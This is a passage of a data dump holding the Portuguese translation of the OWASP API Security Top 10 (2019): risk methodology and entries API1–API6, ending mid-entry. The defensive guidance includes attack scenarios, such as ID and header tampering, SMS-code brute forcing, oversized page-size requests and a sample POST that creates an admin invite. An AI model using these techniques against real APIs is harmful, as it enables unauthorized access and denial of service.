foi originalmente produzido.\n\nAcreditamos que este é um contributo válido na missão de consciencializar e\neducar todos quantos estão envolvidos no desenvolvimento e manutenção de APIs e\n_software_ em geral para questões relacionadas com segurança.\n\nA tradução deste documento para Português (Portugal) decorreu durante um período\nconturbado em que enfrentamos uma pandemia global, em consequência da qual\nvivemos em isolamento social. Este trabalho é também uma demonstração daquilo\nque podemos construir em conjunto ainda que condicionados de alguma forma.\n\nEsta tradução resulta do esforço de:\n\n* Paulo Alexandre Silva <me@pauloasilva.com>\n* Rui Silva <riusalvi@gmail.com>\n\n[1]: ./0xd0-about-data.md\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:42.594254"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0x10-api-security-risks.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0x10-api-security-risks.md", "content": "# Riscos de Segurança em APIs\n\nPara a análise de risco usámos a [metodologia de avaliação de risco da\nOWASP][1].\n\nA tabela seguinte resume a terminologia associada à pontuação correspondente ao\nnível de risco.\n\n| Agentes Ameaça | Abuso | Prevalência | Deteção | Impacto Técnico | Impacto Negócio |\n| :-: | :-: | :-: | :-: | :-: | :-: |\n| Específico da API | Fácil **3** | Predominante **3** | Fácil **3** | Grave **3** | Específico do Negócio |\n| Específico da API | Moderado **2** | Comum **2** | Moderado **2** | Moderado **2** | Específico do Negócio |\n| Específico da API | Difícil **1** | Incomum **1** | Difícil **1** | Reduzido **1** | Específico do Negócio |\n\n**Nota**: Esta abordagem não toma em consideração a verosimilhança do Agente de\nAmeaça. Também não toma em consideração nenhum detalhe técnico associado à sua\nAPI. Qualquer um destes fatores podem ter impacto significativo na probabilidade\ndum atacante encontrar e abusar duma falha de segurança particular. Estes\nindicadores não tomam em consideração o impacto atual no seu negócio. Terá de\nser a sua organização a decidir qual o nível de risco para a segurança das suas\naplicações e APIs que está disposta a aceitar, baseado na cultura, indústria e\nregulação a que está sujeita. O propósito do OWASP API Security Top 10 não é\nfazer essa análise por si.\n\n## Referências\n\n### OWASP\n\n* [OWASP Risk Rating Methodology][1]\n* [Artigo sobre Threat/Risk Modeling][2]\n\n### Externas\n\n* [ISO 31000: Risk Management Std][3]\n* [ISO 27001: ISMS][4]\n* [NIST Cyber Framework (US)][5]\n* [ASD Strategic Mitigations (AU)][6]\n* [NIST CVSS 3.0][7]\n* [Microsoft Threat Modeling Tool][8]\n\n[1]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[2]: https://www.owasp.org/index.php/Threat_Risk_Modeling\n[3]: https://www.iso.org/iso-31000-risk-management.html\n[4]: https://www.iso.org/isoiec-27001-information-security.html\n[5]: https://www.nist.gov/cyberframework\n[6]: https://www.asd.gov.au/infosec/mitigationstrategies.htm\n[7]: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator\n[8]: https://www.microsoft.com/en-us/download/details.aspx?id=49168\n", "timestamp": "2025-10-24T22:26:42.699187"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0x11-t10.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0x11-t10.md", "content": "# OWASP Top 10 API Security Risks – 2019\n\n| Risk | Description |\n| ---- | ----------- |\n| API1:2019 - Broken Object Level Authorization | As APIs tendem a expor mais _endpoints_  que manipulam identificadores de objetos, tornando as falhas no controlo de acessos mais suscetíveis a ataques. A verificação da autorização para acesso aos objetos deve ser tida em consideração em todas as funções que acedem a dados com base em informação fornecida pelo utilizador. |\n| API2:2019 - Broken User Authentication | Com frequência os mecanismos de autenticação são implementados de forma incorreta, permitindo aos atacantes comprometer os _tokens_ de autenticação ou abusar das falhas na implementação por forma a assumir a identidade de outros utilizadores de forma temporária ou permanente. |\n| API3:2019 - Excessive Data Exposure | Na tentativa de fazer implementações genéricas os programadores tendem a expor todas as propriedades dum objeto sem ter em consideração quão sensível é cada uma delas, delegando nos clientes a filtragem daquelas que devem ser apresentadas ao utilizador. |\n| API4:2019 - Lack of Resources & Rate Limiting | Com frequência as APIs não impõem quaisquer restrições no tamanho ou número de recursos que um cliente/utilizador pode solicitar. Não só isto pode ter impacto no desempenho do servidor da API, conduzindo à negação do serviço (DoS), mas também deixa a porta aberta para problemas de autenticação tais como ataques de força bruta. |\n| API5:2019 - Broken Function Level Authorization | Política de controlo de acesso complexas com diferentes níveis hierárquicos, grupos e perfis e uma não tão clara separação entre o que são ou não funcionalidades administrativas tendem a conduzir a falhas de autorização. Abusando destas falhas os atacantes podem ganhar acesso a recursos doutros utilizadores e/ou a funcionalidades administrativas. |\n| API6:2019 - Mass Assignment | Atribuir a informação fornecida pelo cliente (e.g., JSON) aos modelos de dados sem a devida filtragem das propriedades com base em _whitelists_, conduzem tipicamente a problemas de atribuição em massa (_Mass Assignment_). Quer seja através da adivinhação das propriedades do objeto, explorando outros _endpoints_ da API ou consulta da documentação,  fornecendo propriedades adicionais no conteúdo dos pedidos permite aos atacantes modificar propriedades dos objetos que não eram supostos. |\n| API7:2019 - Security Misconfiguration | Tipicamente as más configurações de segurança resultam de configurações por omissão, incompletas ou que se destinam a um fim específico, armazenamento na nuvem aberto, falha na configuração dos cabeçalhos HTTP de segurança, métodos HTTP não utilizados, política permissiva de Partilha de Recursos Entre Origens (CORS) e mensagens de erro contendo informação sensível. |\n| API8:2019 - Injection | Falhas de injeção tais como SQL, NoSQL, injeção de comandos, etc., ocorrem quando dados não confiáveis são enviados a um interpretador como parte dum comando ou consulta. Desta forma o interpretador acaba por executar comandos que não era expectável executar ou aceder a dados sem a devida autorização. |\n| API9:2019 - Improper Assets Management | As APIs tendem a expor mais _endpoints_ do que as aplicações web tradicionais, fazendo com que a documentação se torne ainda mais importante. Um inventário dos _hosts_ e APIs em execução também têm um papel importante na mitigação de falhas tais como versões de APIs descontinuadas e exposição de _endpoints_ para análise de problemas. |\n| API10:2019 - Insufficient Logging & Monitoring | A insuficiência no registo de eventos e monitorização, em conjugação com a falta ou ineficácia da integração com a resposta a incidentes, permite aos atacantes continuar a sua prática, persistir os seus ataques, alcançar outros sistemas, extrair ou destruir dados. A maioria dos estudos demonstra que o tempo de deteção duma quebra de segurança vai além dos 200 dias, sendo tipicamente detetada por entidades externas, ao invés de processo internos ou monitorização. |\n", "timestamp": "2025-10-24T22:26:42.822994"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0xa1-broken-object-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0xa1-broken-object-level-authorization.md", "content": "# API1:2019 Broken Object Level Authorization\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **3** | Prevalência **3** : Deteção **2** | Técnico **3** : Específico do Negócio |\n| Os atacantes podem abusar dos _endpoints_ vulneráveis da API através da manipulação do identificador dum objeto que é enviado como parte do pedido. Isto pode conduzir ao acesso não autorizado a informação sensível. Este problema é extremamente comum porque os componentes do servidor normalmente não mantém o estado do cliente, baseando-se essencialmente em parâmetros tais como o identificador do objeto que é enviado para decidir qual o objeto a aceder. | Este tem sido o ataque mais comum e com maior impacto em APIs. Os mecanismos de autorização e controlo de acessos em aplicações modernas são complexos e abrangentes. Ainda que a aplicação implemente uma infraestrutura adequada para validação de autorização, os programadores podem esquecer-se de a realizar antes de aceder a informação sensível. A identificação de problemas no controlo de acessos não é de fácil deteção através de análise estática ou dinâmica. | Acesso não autorizado pode resultar na divulgação de informação a entidades não autorizadas, perda ou manipulação de dados. O acesso não autorizado a objetos pode ainda conduzir à usurpação de contas de utilizador. |\n\n## A API é vulnerável?\n\nA autorização de acesso ao nível do objeto é um mecanismo de controlo\ntipicamente implementado ao nível do código para validar que um utilizador só\npode aceder aos objetos aos quais tem acesso.\n\nTodos os _endpoints_ duma API que recebem identificadores de objetos e que\nexecutam algum tipo de ação sobre os mesmos, devem implementar verificações de\nautorização a esse nível. A verificação de acesso deve validar que o utilizador\ncom a sessão ativa tem permissão para realizar a ação solicitada sobre o objeto\nem questão.\n\nFalhas neste mecanismo tipicamente conduzem à divulgação não autorizada de\ninformação, modificação ou destruição de todos os dados.\n\n## Exemplos de Cenários de Ataque\n\n### Cenário #1\n\nUma plataforma de comércio eletrónico para criar lojas online oferece uma página\nde listagem com gráficos relativos à receita das lojas. Inspecionando os pedidos\nrealizados pelo navegador um atacante identifica os _endpoints_ da API usados\npara obter os dados a partir dos quais são gerados os gráficos bem como o seu\npadrão `/shops/{shopName}/revenue_data.json`. Utilizado outro _endpoint_ da API\no atacante obtém a lista com o nome de todas as lojas. Com recurso a um _script_\nsimples para substituir `{shopName}` no URL pelos nomes que constam da lista, o\natacante consegue acesso aos dados relativos às vendas de milhares de lojas\nonline.\n\n### Cenário #2\n\nMonitorizando o tráfego de rede dum dispositivo _wearable_, o pedido HTTP\n`PATCH` capta a atenção dum atacante devido à utilização do cabeçalho\nnão-standard `X-User-ID: 54796`.\n\nSubstituindo o valor do cabeçalho `X-User-Id` por `54795` o atacante recebe uma\nresposta afirmativa, conseguindo manipular os dados da conta doutro utilizador.\n\n## Como Prevenir\n\n* Implementar um mecanismo de autorização baseado nas políticas de utilizador e\n  hierarquia.\n* Utilizar um mecanismo de autorização para verificar se o utilizador com sessão\n  ativa tem permissão para realizar a ação pretendida sobre o registo. Esta\n  verificação deve ser feita por todas as funções que utilizem informação\n  fornecida pelo cliente para aceder a um registo na base de dados.\n* Utilizar preferencialmente valores aleatórios e não previsíveis (e.g., GUID)\n  como identificador para os registos.\n* Escrever testes para avaliar o correto funcionamento do mecanismo de\n  autorização. Não colocar em produção alterações vulneráveis que não passem nos\n  testes.\n\n## Referências\n\n### Externas\n\n* [CWE-284: Improper Access Control][1]\n* [CWE-285: Improper Authorization][2]\n* [CWE-639: Authorization Bypass Through User-Controlled Key][3]\n\n[1]: https://cwe.mitre.org/data/definitions/284.html\n[2]: https://cwe.mitre.org/data/definitions/285.html\n[3]: https://cwe.mitre.org/data/definitions/639.html\n", "timestamp": "2025-10-24T22:26:42.931587"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0xa2-broken-user-authentication.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0xa2-broken-user-authentication.md", "content": "# API2:2019 Broken User Authentication\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **3** | Prevalência **2** : Deteção **2** | Técnico **3** : Específico Negócio |\n| A autenticação em APIs é um mecanismo complexo e confuso. Engenheiros de software e segurança podem ter conceções erradas com relação ao âmbito da autenticação e como implementá-la corretamente. Por outro lado os mecanismos de autenticação são um alvo fácil para os atacantes uma vez que estão expostos publicamente. Estes dois pontos tornam o componente responsável pela autenticação potencialmente vulnerável a diferentes tipos de abuso. | Podemos dividir os problemas de autenticação em duas partes: 1. Falta de mecanismos de proteção: os _endpoints_ responsáveis pela autenticação devem ser tratados de forma diferente dos demais _endpoints_, implementando camadas de proteção adicionais 2. Falhas na implementação do mecanismo: este é utilizado/implementado sem considerar os vetores de ataque específicos ou baseado em casos de uso desadequados (e.g., um mecanismo de autenticação desenhado para clientes IoT pode não ser a melhor escolha para aplicações web). | Os atacantes podem obter o controlo sobre as contas doutros utilizadores, aceder aos seus dados pessoais e realizar ações sensíveis em seu nome, como por exemplo transferências financeiras ou envio de mensagens pessoais. |\n\n## A API é vulnerável?\n\nOs _endpoints_ e fluxos de autenticação são ativos que carecem de proteção.\nMecanismos de recuperação de _password_ devem ser tratados da mesma forma que os\nmecanismos de autenticação.\n\nUma API é vulnerável se:\n* Permite ataques de [_credential stuffing_][1] em que o atacante tem uma lista de\n  nomes de utilizador e _passwords_ válidos.\n* Permite ataques de força bruta a uma conta de utilizador específica, não\n  implementando mecanismos de mitigação como _captcha_ ou bloqueio da conta por\n  excesso de tentativas de autenticação falhadas.\n* Permite a utilização de _passwords_ fracas.\n* Envia informação de autenticação, tal como _tokens_ e _passwords_, no URL.\n* Não valida a autenticidade dos _tokens_ de autenticação.\n* Aceita _tokens_ JWT sem que estes sejam assinados/usando algoritmos fracos\n  `(\"alg\":\"none\")` ou não valida a sua data de expiração.\n* Utiliza _passwords_ em texto, não encriptadas, ou resumos fracos.\n* Utiliza chaves de encriptação fracas.\n\n## Exemplos de Cenários de Ataque\n\n### Cenário #1\n\nAtaques de [_Credential Stuffing_][1] utilizando [listas de nomes de utilizador/\n_passwords_ conhecidas][2] são bastante comuns. Se uma API não implementa\nproteções contra ameaças automatizadas ou Credential Stuffing, esta pode ser\nusada como oráculo para identificar se as credenciais são válidas.\n\n### Cenário #2\n\nUm atacante inicia o fluxo de recuperação de _password_, enviando um pedido\n`POST` com o nome de utilizador para o _endpoint_\n`/api/system/verification-codes`. Um código de 6 dígitos é enviado para o\ntelefone da vítima. Porque a API não implementa uma política de limitação do\nnúmero de pedidos, com recurso a um _script multi-thread_ que envia as\ncombinações possíveis para o _endpoint_\n`/api/system/verification-codes/{smsToken}`, o atacante consegue em poucos\nminutos descobrir o código enviado na SMS.\n\n## Como Prevenir\n\n* Certifique-se de que conhece todos os fluxos de autenticação possíveis (e.g.\n  móvel/web/_deeplinks_/etc.).\n* Pergunte aos engenheiros responsáveis quais os fluxos em falta/não\n  identificados.\n* Leia sobre os mecanismos de autenticação em uso. Certifique-se que compreende\n  quais e como são usados. OAuth não é um mecanismo de autenticação, assim como\n  também não o são as API _keys_.\n* Não reinvente a roda em termos de autenticação, geração de _tokens_,\n  armazenamento de _passwords_. Opte pela utilização de standards.\n* _Endpoints_ para recuperação de _password_ devem ser tratados como os\n  _endpoints_ de _login_ no que diz respeito à proteção contra ataques de força\n  bruta, limitação do número de pedidos e bloqueio de conta.\n* Utilize a  [OWASP Authentication Cheatsheet][3].\n* Sempre que possível implemente autenticação de múltiplos fatores.\n* Implemente mecanismos anti-força bruta para mitigar ataques do tipo\n  _credential stuffing_, dicionário e força bruta nos _endpoints_ de\n  autenticação. Este mecanismo deve ter configurações mais restritivas do que\n  para os demais _endpoints_ da API.\n* Implemente [mecanismos de bloqueio de conta][4] / _captcha_ para prevenir\n  ataques de força bruta contra utilizadores específicos. Implemente verificação\n  da qualidade/força das _passwords_.\n* As API _keys_ não devem ser usadas para autenticação dos utilizadores, mas ao\n  invés para [autenticação dos clientes da API][5].\n\n## Referências\n\n### OWASP\n\n* [OWASP Key Management Cheat Sheet][6]\n* [OWASP Authentication Cheatsheet][3]\n* [Credential Stuffing][1]\n\n### Externas\n\n* [CWE-798: Use of Hard-coded Credentials][7]\n\n[1]: https://owasp.org/www-community/attacks/Credential_stuffing\n[2]: https://github.com/danielmiessler/SecLists\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html\n[4]: https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism.md\n[5]: https://cloud.google.com/endpoints/docs/openapi/when-why-api-key\n[6]: https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html\n[7]: https://cwe.mitre.org/data/definitions/798.html\n", "timestamp": "2025-10-24T22:26:43.041881"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0xa3-excessive-data-exposure.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0xa3-excessive-data-exposure.md", "content": "# API3:2019 Excessive Data Exposure\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **3** | Prevalência **2** : Deteção **2** | Técnico **2** : Específico Negócio |\n| Abusar desta falha de segurança é simples e tipicamente passa pela inspeção do tráfego de rede para analisar as respostas da API em busca de dados que não devessem ser devolvidos ao utilizador. | As APIs delegam nos clientes a responsabilidade de filtrar os dados. Uma vez que as APIs são usadas como fonte de dados, com frequência os programadores procuram fazer implementações genéricas sem ter em consideração a relevância dos dados expostos. Regra geral as ferramentas automáticas não conseguem detetar este tipo de vulnerabilidade por ser difícil distinguir dados legítimos retornados pela API doutros sensíveis que não deveriam ser expostos. Esta tarefa exige um profundo conhecimento da aplicação. | _Excessive Data Exposure_ tipicamente conduz à exposição de dados sensíveis. |\n\n## A API é vulnerável?\n\nQuando a API devolve dados sensíveis aos clientes. Estes dados são normalmente\nfiltrados pelo cliente antes de serem apresentados ao utilizador. Um atacante\npode facilmente inspecionar o tráfego de rede e aceder aos dados sensíveis.\n\n## Exemplos de Cenários de Ataque\n\n### Cenário #1\n\nA equipa de desenvolvimento móvel usa o _endpoint_\n`/api/articles/{articleId}/comments/{commentId}` na interface de visualização\ndos artigos para apresentar os detalhes dos comentários. Inspecionando o tráfego\nde rede da aplicação móvel, um atacante descobre que outros dados sensíveis\nrelacionados com o autor do comentário fazem ainda parte da resposta da API. O\nmétodo `toJSON()`, pertencente ao modelo `User`, é usado na implementação do\nendpoint para preparar os dados a retornar, o qual inclui informação pessoal.\n\n### Cenário #2\n\nUm sistema de vigilância baseado em IoT permite aos utilizadores com perfil de\nadministrador criar outros utilizadores com diferentes permissões. Um\nadministrador cria uma conta de utilizador para um segurança recém-chegado, o\nqual apenas tem acesso a câmaras específicas instaladas no edifício. A aplicação\nmóvel usada pelo segurança realiza um pedido ao _endpoint_\n`/api/sites/111/cameras` para obter os dados relativos às câmaras a mostrar na\ninterface. A resposta contém a lista com os detalhes das câmaras no formato\n`{\"id\":\"xxx\",\"live_access_token\":\"xxxx-bbbbb\",\"building_id\":\"yyy\"}`. Embora na\ninterface apenas seja possível ver as câmaras às quais o guarda tem acesso, a\nresposta da API inclui informação sobre todas as câmaras instaladas.\n\n## Como Prevenir\n\n* Nunca delegar no cliente a responsabilidade de filtrar os dados.\n* Rever as respostas da API, certificando-se que apenas incluem dados legítimos.\n* Os engenheiros responsáveis devem questionar-se sempre sobre “quem são os\n  consumidores dos dados” antes de exporem um _endpoint_.\n* Evitar a utilização de métodos genéricos tais como `to_json()` e\n  `to_string()`. Pelo contrário, escolher uma-a-uma as propriedades que\n  realmente devem ser devolvidas na resposta.\n* Classificar a informação sensível e pessoal (PII) que a API armazena e\n  manipula, revendo todos as chamadas à API onde esta informação é devolvida por\n  forma a avaliar se existe algum risco para a segurança.\n* Utilizar schemas para validar as respostas da API enquanto camada adicional de\n  segurança. Como parte desta abordagem, definir e assegurar a validação das\n  respostas do diferentes métodos HTTP, incluindo erros.\n\n## Referências\n\n### Externas\n\n* [CWE-213: Intentional Information Exposure][1]\n\n[1]: https://cwe.mitre.org/data/definitions/213.html\n", "timestamp": "2025-10-24T22:26:43.150225"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0xa4-lack-of-resources-and-rate-limiting.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0xa4-lack-of-resources-and-rate-limiting.md", "content": "# API4:2019 Lack of Resources & Rate Limiting\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **2** | Prevalência **3** : Deteção **3** | Técnico **2** : Específico Negócio |\n| Para abusar destas falhas basta realizar pedidos simples à API. Não é necessária autenticação. Múltiplos pedidos concorrentes podem ser realizados por um único computador ou fazendo uso de recursos computacionais na nuvem. | É comum encontrar APIs que não limitam o número de pedidos ou que usam limites desajustados. | O abuso destas falhas pode conduzir à negação de serviço (DoS), deixando a API incapaz de satisfazer outros pedidos ou mesmo indisponível. |\n\n## A API é vulnerável?\n\nOs pedidos a uma API consomem recursos tais como largura de banda, processador,\nmemória e armazenamento. A quantidade de recursos necessária para satisfazer um\npedido depende essencialmente da informação enviada pelo utilizador e da lógica\nde negócio implementa pelo _endpoint_. Deve ainda ter-se em consideração que os\npedidos de diferentes clientes concorrem entre si por estes recursos. A API é\nvulnerável se pelo menos um dos seguintes limites não está definido ou foi\nconfigurado com um valor desajustado (e.g. demasiado baixo/alto):\n\n* Tempo máximo de execução\n* Quantidade máxima de memória alocada\n* Número de ficheiros abertos\n* Número de processos\n* Tamanho do pedido (e.g., uploads)\n* Número de pedidos por cliente/recurso\n* Número de registos por página devolvidos numa única resposta a um pedido\n\n## Exemplos de Cenários de Ataque\n\n### Cenário #1\n\nUm atacante carrega uma imagem de grandes dimensões realizando um pedido `POST`\npara o _endpoint_ `/api/v1/images`. Após concluir o carregamento a API cria\nvárias miniaturas de diferentes dimensões. Devido à dimensão da imagem carregada\na memória disponível é esgotada durante a criação das miniaturas e a API fica\nindisponível.\n\n### Cenário #2\n\nUma aplicação apresenta uma listagem de utilizadores até ao limite de 200 por\npágina. A lista dos utilizadores é obtida por meio dum pedido ao _endpoint_\n`/api/users?page=1&size=200`. Um atacante altera o valor do parâmetro `size`\nde `200` para `200000`, causando problemas de performance no servidor de base de\ndados. Enquanto se verificam estes problemas de performance a API fica\nindisponível e incapaz de satisfazer pedidos de qualquer utilizador (DoS).\n\nO mesmo cenário pode ser usado para provocar erros do tipo _Integer Overflw_ ou\n_Buffer Overflow_.\n\n## Como Prevenir\n\n* Tecnologias como Docker tornam mais fácil a definição de limites de\n  [memória][1], [processador][2], [número de _restarts_][3],\n  [número de ficheiros abertos e processos][4].\n* Limitar o número máximo de pedidos à API, por cliente, dentro dum determinado\n  período de tempo.\n* Notificar o cliente quando o limite de pedidos foi excedido, informando o\n  valor desse limite e o tempo restante para poder voltar a realizar novos\n  pedidos.\n* Validar de forma adequada os parâmetros enviados na _query string_ e corpo do\n  pedido, em particular aqueles que controlam o número de registos a retornar na\n  resposta.\n* Definir e forçar um tamanho máximo de dados para todos os parâmetros e dados\n  de entrada, tais como comprimento máximo para os texto ou número máximo de\n  elementos duma lista.\n\n## Referências\n\n### OWASP\n\n* [Blocking Brute Force Attacks][5]\n* [Docker Cheat Sheet - Limit resources (memory, CPU, file descriptors,\n  processes, restarts)][6]\n* [REST Assessment Cheat Sheet][7]\n\n### Externas\n\n* [CWE-307: Improper Restriction of Excessive Authentication Attempts][8]\n* [CWE-770: Allocation of Resources Without Limits or Throttling][9]\n* \"_Rate Limiting (Throttling)_\" - [Security Strategies for Microservices-based\n  Application Systems][10], NIST\n\n[1]: https://docs.docker.com/config/containers/resource_constraints/#memory\n[2]: https://docs.docker.com/config/containers/resource_constraints/#cpu\n[3]: https://docs.docker.com/engine/reference/commandline/run/#restart-policies---restart\n[4]: https://docs.docker.com/engine/reference/commandline/run/#set-ulimits-in-container---ulimit\n[5]: https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks\n[6]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/Docker_Security_Cheat_Sheet.md#rule-7---limit-resources-memory-cpu-file-descriptors-processes-restarts\n[7]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[8]: https://cwe.mitre.org/data/definitions/307.html\n[9]: https://cwe.mitre.org/data/definitions/770.html\n[10]: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204-draft.pdf\n", "timestamp": "2025-10-24T22:26:43.267109"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0xa5-broken-function-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0xa5-broken-function-level-authorization.md", "content": "# API5:2019 Broken Function Level Authorization\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **3** | Prevalência **2** : Deteção **1** | Técnico **2** : Específico Negócio |\n| Para abusar deste tipo de falha o atacante tem de realizar pedidos legítimos ao _endpoint_ da API ao qual não é suposto ter acesso. Estes _endpoints_ podem estar disponíveis para utilizadores anónimos, ordinários ou não privilegiados. É fácil identificar estas falhas em APIs uma vez que  estas são mais estruturada, sendo a forma de acesso a certas funcionalidades mais previsível (e.g., utilizar o método HTTP `PUT` ao invés de `GET` ou substituir a palavra \"user\" por \"admin\" no URL). | As verificações de autorização para aceder a uma determinada função ou recurso são normalmente geridas por configuração e às vezes ao nível da implementação. A correta implementação destes mecanismos pode tornar-se confusa, uma vez que, as aplicações modernas prevêem vários perfis ou grupos de utilizador, assim como complexos esquemas de hierarquia (e.g., sub-utilizadores, utilizadores com mais do que um perfil). | Estas falhas permitem aos atacantes aceder de forma não autorizada a certas funcionalidades. As funcionalidades administrativas são o alvo preferencial neste tipo de ataque. |\n\n## A API é vulnerável?\n\nA melhor forma de identificar falhas de verificação de autorização de acesso a\nfunções é através duma análise detalhada do mecanismo de autorização, devendo\nter-se em consideração o esquema de hierarquia de utilizadores, diferentes\nperfis ou grupos e questionando continuamente:\n\n* Utilizadores ordinários podem aceder aos _endpoints_ de administração?\n* Os utilizadores podem realizar ações sensíveis (e.g. criar, modificar ou\n  apagar) para as quais não deveriam ter acesso, alterando simplesmente o método\n  HTTP (e.g. alterando de `GET` para `DELETE`)?\n* Um utilizador do grupo X pode aceder a uma função reservada ao grupo Y,\n  adivinhando o URL do _endpoint_ e os parâmetros (e.g.\n  `/api/v1/users/export_all`)?\n\nNunca assuma o tipo dum _endpoint_, normal ou administrativo, apenas com base no\nURL.\n\nApesar dos programadores poderem ter decidido expor a maioria dos _endpoints_\nadministrativos sob um mesmo prefixo, e.g. `api/admins`, é comum encontrarem-se\n_endpoints_ administrativos sob outros prefixos, misturados com _endpoints_\nordinários e.g. `api/users`.\n\n## Exemplos de Cenários de Ataque\n\n### Cenário #1\n\nDurante o processo de registo numa aplicação que apenas permite o registo de\nutilizadores por convite, é realizado um pedido `GET` ao _endpoint_\n`/api/invites/{invite_guid}`. A resposta em formato JSON contém detalhes sobre o\nconvite, incluindo o perfil de utilizador e o seu endereço de email.\nUm atacante duplica o pedido e altera o método HTTP e o _endpoint_ do medido\npara `POST /api/invites/new`. Esta funcionalidade deveria estar apenas\ndisponível para administradores através da consola de administração, uma vez que\no _endpoint_ não implementa verificações de autorização de acesso à função.\n\nO atacante abusa da falha e envia para si próprio um convite para criar uma\nconta de administrador:\n\n```\nPOST /api/invites/new\n\n{“email”:”hugo@malicious.com”,”role”:”admin”}\n```\n\n### Cenário #2\n\nUma API implementa um _endpoint_ que é suposto estar apenas disponível para\nadministradores - `GET /api/admin/v1/users/all`. Este _endpoint_ devolve os\ndetalhes de todos os utilizadores da aplicação e não realiza qualquer\nverificação de autorização de acesso à função. Com base no conhecimento\nadquirido sobre a estrutura da API um atacante consegue prever com um elevado\ngrau de certeza o URL do _endpoint_, ganhado acesso ao dados sensíveis de todos\nos utilizadores da aplicação.\n\n## Como Prevenir\n\nA sua API deve usar um módulo de autorização consistente e fácil de analisar, o\nqual deve ser invocado por todas as funções de negócio. Frequentemente, este\ntipo de proteção é oferecido por um ou mais componentes externos à lógica\naplicacional.\n\n* Por omissão todos os acesso devem ser negados, exigindo que permissões\n  específicas sejam concedidas a perfis específicos para acesso a cada função.\n* Rever todos os _endpoints_ à procura de falhas ao nível da verificação de\n  autorização de acesso a funções, tendo sempre em consideração a lógica de\n  negócio da aplicação e hierarquia dos grupos.\n* Assegurar que todos os controladores administrativos herdam dum controlador\n  administrativo base que implementa as verificações de autorização com base no\n  grupo/perfil do utilizador.\n* Assegurar que funções administrativas num controlador ordinário implementam\n  elas próprias as verificações de autorização baseadas no grupo e perfil do\n  utilizador.\n\n## Referências\n\n### OWASP\n\n* [OWASP Article on Forced Browsing][1]\n* [OWASP Top 10 2013-A7-Missing Function Level Access Control][2]\n* [OWASP Development Guide: Chapter on Authorization][3]\n\n### Externas\n\n* [CWE-285: Improper Authorization][4]\n\n[1]: https://owasp.org/www-community/attacks/Forced_browsing\n[2]: https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control\n[3]: https://owasp.org/www-community/Access_Control\n[4]: https://cwe.mitre.org/data/definitions/285.html\n", "timestamp": "2025-10-24T22:26:43.375900"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/pt-pt/0xa6-mass-assignment.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/pt-pt/0xa6-mass-assignment.md", "content": "# API6:2019 - Mass Assignment\n\n| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |\n| - | - | - |\n| Específico da API : Abuso **2** | Prevalência **2** : Deteção **2** | Técnico **2** : Específico Negócio |\n| O abuso requer na maioria das vezes um conhecimento da lógica de negócio, de relações entre objetos, e da estrutura da API. Abusar de Mass Assignment é mais fácil em APIs, visto que por design elas expõem a implementação interna da aplicação e nomes de propriedades. | As _frameworks_ modernas incentivam os programadores a usar funções que ligam automaticamente dados do cliente a variáveis no código e objetos internos. Os atacantes podem usar esta metodologia para atualizar ou mudar propriedades sensíveis de objetos que os programadores não pretendiam realmente expor. | O abuso pode levar a elevação de privilégios, manipulação de dados, contornar mecanismos de segurança, etc. |\n\n## A API é vulnerável?\n\nOs objetos em aplicações modernas podem conter muitas propriedades. Algumas\ndestas propriedades podem ser atualizadas diretamente pelo cliente (e.g.,\n`user.first_name` ou `user.address`), mas outras não (e.g., a _flag_\n`user.is_vip`).\n\nUm _endpoint_ é vulnerável se converter automaticamente parâmetros do\ncliente em propriedades internas de um objeto, sem considerar a sensibilidade e\no nível de exposição destas propriedades. Isto pode permitir a um atacante\natualizar propriedades de objetos, às quais ele não deveria ter acesso.\n\nExemplos de propriedades sensíveis:\n\n* **Propriedades relacionadas com permissões**: `user.is_admin`, `user.is_vip`\n  devem ser modificadas apenas por administradores.\n* **Propriedades dependentes de processos**: `user.cash` deve ser modificada\n  apenas internamente depois da verificação de pagamento.\n* 